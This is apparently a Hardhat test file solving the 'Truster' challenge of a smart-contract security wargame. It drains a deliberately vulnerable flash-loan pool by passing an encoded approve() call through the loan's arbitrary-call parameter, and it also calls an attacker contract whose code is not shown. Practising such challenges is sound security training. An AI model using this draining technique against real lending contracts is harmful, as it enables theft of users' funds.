const {ethers} = require('hardhat');
const {expect} = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it.skip('Exploit.v1', async function () {
        /**
         * This does not work, though it seems like it should!
         **/
        const approvePayload = this.token.interface.encodeFunctionData("approve(address,uint256)", [
            await attacker.address, (await this.token.balanceOf(this.pool.address))
        ])
        let txn = await this.pool.flashLoan(0, await attacker.address, await this.token.address, approvePayload);
        txn.wait();

        txn = await this.token
            .connect(await attacker.address)
            .transferFrom(
                await this.pool.address, await attacker.address, (await this.token.balanceOf(this.pool.address))
            );
        txn.wait(1);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const attackerFactory = await ethers.getContractFactory("TrusterLenderAttacker", deployer);
        const attackerContract = await attackerFactory.deploy();
        let txn = await attackerContract.attack(
            await this.token.address,
            await this.pool.address,
            await attacker.address
        );
        txn.wait(1);
        expect(await txn.hash).to.be.not.null;
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

